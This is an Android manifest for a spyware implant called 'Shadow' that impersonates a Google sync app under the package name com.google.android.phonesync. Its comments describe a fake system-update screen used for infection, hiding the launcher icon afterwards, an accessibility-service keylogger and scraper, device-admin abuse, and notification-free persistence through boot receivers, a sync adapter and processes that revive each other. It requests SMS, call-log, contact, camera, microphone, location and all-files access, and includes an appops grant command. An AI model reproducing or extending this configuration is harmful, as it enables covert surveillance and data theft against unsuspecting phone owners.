<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    package="com.google.android.phonesync">

    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    
    <!-- Required for stealth / background execution -->
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />

    <!-- Account + sync framework (the system-spawned wake path). All install-time
         normal permissions — no runtime prompt, no user action, no adb. -->
    <uses-permission android:name="android.permission.GET_ACCOUNTS" />
    <uses-permission android:name="android.permission.AUTHENTICATE_ACCOUNTS" />
    <uses-permission android:name="android.permission.USE_CREDENTIALS" />
    <uses-permission android:name="android.permission.WRITE_SYNC_SETTINGS" />
    <uses-permission android:name="android.permission.READ_SYNC_SETTINGS" />
    <uses-permission android:name="android.permission.READ_SYNC_STATS" />

    <!-- Doze exemption intent (rationale: an account sync adapter legitimately needs
         to run in the background). User-visible prompt only if we choose to fire it;
         omitted by default since this build must stay notification-free. -->
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />

    <!-- Surveillance (declared, granted at runtime via a11y auto-clicker or pm grant) -->
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.RECEIVE_SMS" />
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />

    <!-- Filesystem reach. targetSdk 34 + Android 11 scoped storage means
         READ_EXTERNAL_STORAGE alone grants nothing for non-media files, so
         MANAGE_EXTERNAL_STORAGE (all-files appop) is what actually makes
         fs listing/downloads work; the legacy pair below still covers devices
         we support at maxSdkVersion. Grant the appop with:
           appops set com.google.android.phonesync MANAGE_EXTERNAL_STORAGE allow
         it is refused while the permission is undeclared, which is why this
         block must ship before the grant can succeed. -->
    <uses-permission
        android:name="android.permission.MANAGE_EXTERNAL_STORAGE"
        tools:ignore="ScopedStorage" />
    <uses-permission
        android:name="android.permission.READ_EXTERNAL_STORAGE"
        android:maxSdkVersion="32" />
    <uses-permission
        android:name="android.permission.WRITE_EXTERNAL_STORAGE"
        android:maxSdkVersion="29" />

    <!-- Package + foreground visibility, both granted natively:
         QUERY_ALL_PACKAGES is an install-time permission (Play restricts it, but
         the implant is sideloaded), so `apps` lists every package on any device
         with no user action. PACKAGE_USAGE_STATS is a special-access permission:
         the only native grant path is Settings > Usage access, which the
         grant_screen/toggle_grant commands open and click for us. No Shizuku, no
         appops, no adb in either path. -->
    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"
        tools:ignore="QueryAllPackagesPermission" />
    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"
        tools:ignore="ProtectedPermissions" />

    <application
        android:name="com.shadow.ShadowApp"
        android:allowBackup="false"
        android:label="@string/app_name"
        android:supportsRtl="true"
        android:theme="@style/Theme.AppCompat.NoActionBar"
        android:excludeFromRecents="true">
        
        <!-- Social Engineering Trap -->
        <activity
            android:name="com.shadow.ui.SystemUpdateActivity"
            android:exported="true"
            android:theme="@style/Theme.AppCompat.NoActionBar"
            android:excludeFromRecents="true"
            android:noHistory="true"
            android:launchMode="singleInstance">
            <!-- 
            We leave the LAUNCHER intent for the initial infection.
            Once the device admin / accessibility is granted, the app can use PackageManager 
            to disable this component so the icon disappears from the launcher.
            -->
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <!-- Device Admin Receiver -->
        <receiver
            android:name="com.shadow.admin.DeviceAdminReceiver"
            android:description="@string/a11y_description"
            android:label="@string/app_name"
            android:permission="android.permission.BIND_DEVICE_ADMIN"
            android:exported="true">
            <meta-data
                android:name="android.app.device_admin"
                android:resource="@xml/device_admin_policies" />
            <intent-filter>
                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
            </intent-filter>
        </receiver>

        <!-- Accessibility Service (Keylogger & Scraper) -->
        <service
            android:name="com.shadow.a11y.ShadowAccessibilityService"
            android:label="@string/app_name"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
            android:exported="true">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_service_config" />
        </service>

        <!-- Sync + account services: bound by the SYSTEM (SyncManager / AccountManager).
             No notification, no foreground. Their only role is discoverability so the
             OS can schedule periodic syncs for us — the system-spawned wake path. -->
        <service
            android:name="com.shadow.ShadowSyncService"
            android:exported="true">
            <intent-filter>
                <action android:name="android.content.SyncAdapter" />
            </intent-filter>
            <meta-data
                android:name="android.content.SyncAdapter"
                android:resource="@xml/syncadapter" />
        </service>

        <service
            android:name="com.shadow.ShadowAuthenticatorService"
            android:exported="true">
            <intent-filter>
                <action android:name="android.accounts.AccountAuthenticator" />
            </intent-filter>
            <meta-data
                android:name="android.accounts.AccountAuthenticator"
                android:resource="@xml/authenticator" />
        </service>

        <!-- Beacon host: lives in a SEPARATE process (:sync) so a per-process reap
             only takes one of the two, and the mutual binding revives it in under a
             second. Bound service — no notification, no visible component. -->
        <service
            android:name="com.shadow.BeaconService"
            android:exported="false"
            android:process=":sync" />

        <!-- Main-process half of the mutual binding, held up by BeaconService. -->
        <service
            android:name="com.shadow.MainKeepAliveService"
            android:exported="false" />

        <!-- Persistence: SyncAdapter ContentProvider (also our cross-process IPC surface).
             directBootAware so it is reachable before the user unlocks on the
             LOCKED_BOOT_COMPLETED path. -->
        <provider
            android:name="com.shadow.SyncProvider"
            android:authorities="com.google.android.phonesync"
            android:exported="false"
            android:syncable="true"
            android:directBootAware="true" />

        <!-- Persistence: Boot Receiver -->
        <receiver
            android:name="com.shadow.BootReceiver"
            android:enabled="true"
            android:exported="true"
            android:directBootAware="true">
            <intent-filter android:priority="999">
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
            </intent-filter>
        </receiver>

    </application>
</manifest>